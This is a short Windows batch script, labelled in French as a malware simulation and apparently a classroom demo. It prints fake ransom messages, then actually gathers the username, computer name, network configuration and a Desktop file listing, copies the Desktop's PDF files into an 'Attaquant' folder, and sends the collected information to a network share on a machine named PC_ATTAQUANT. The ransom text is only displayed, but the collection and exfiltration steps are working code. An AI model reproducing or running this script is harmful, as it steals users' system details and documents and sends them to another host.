@echo off
echo Simulation malware
echo Vos fichiers sont compromis

echo Vos fichiers sont chiffres !
echo Pour les recuperer payez 1000$

echo Collecte des informations...
echo Nom utilisateur: %username% >> infos.txt
echo Nom ordinateur: %computername% >> infos.txt
ipconfig >> infos.txt
echo Liste des fichiers du bureau >> infos.txt
dir C:\Users\%username%\Desktop >> infos.txt
mkdir C:\Attaquant
xcopy "C:\Users\%username%\Desktop\*.pdf" "%~dp0Attaquant\" /s /i /y
echo Envoi des informations...
copy infos.txt \\PC_ATTAQUANT\partage\
echo Terminé
pause
